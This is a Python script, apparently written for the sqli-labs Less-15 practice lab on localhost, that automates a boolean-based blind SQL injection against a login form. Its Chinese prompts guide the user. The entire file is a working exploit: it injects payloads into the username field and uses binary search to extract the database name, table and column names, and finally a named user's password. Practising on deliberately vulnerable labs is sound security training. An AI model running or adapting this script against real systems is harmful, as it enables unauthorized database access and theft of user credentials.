import requests
import time

if __name__ == '__main__':
    url = 'http://localhost/sqli-labs/Less-15/'
    result = ''
    schema = ''
    table = ''
    user=''
    for k in range(4):
        i = 0
        result = ''
        if k == 0: print("正在查询数据库名请稍后......")
        if k == 1: schema = input("数据库查询完毕。现在请输入要查询的表所在的库：");print("请稍后......");time.sleep(1)
        if k == 2: table = input("数据表查询完毕。现在请输入要查询的字段所在的表：");print("请稍后......");time.sleep(1)
        if k == 3: user = input("所有字段查询完毕。现在请输入要查询的人的姓名：");print("请稍后......");time.sleep(1)
        while True:
            i = i + 1
            low = 32
            high = 127
            while low < high:
                mid = (low + high) // 2
                if k==0:payload = f"1' or ascii(substr((select database()),{i},1))>{mid}#"
                if k==1:payload = f"1' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='{schema}'),{i},1))>{mid}#"
                if k==2:payload = f"1' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='{table}' and table_schema='{schema}'),{i},1))>{mid}#"
                if k==3:payload = f"1' or ascii(substr((select password from {schema}.{table} where username='{user}'),{i},1))>{mid}#"
                data = {
                    'uname': payload,
                    'passwd': 'admin',
                    'submit': "Submit"
                }
                r = requests.post(url=url, data=data)
                r.encoding = "utf-8"
                if 'flag' not in r.text:
                    high = mid
                else:
                    low = mid + 1
                time.sleep(0.2)
            if low != 32:
                result += chr(low)
                print(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())), '努力加载中......')
                print(result)
            else:
                break
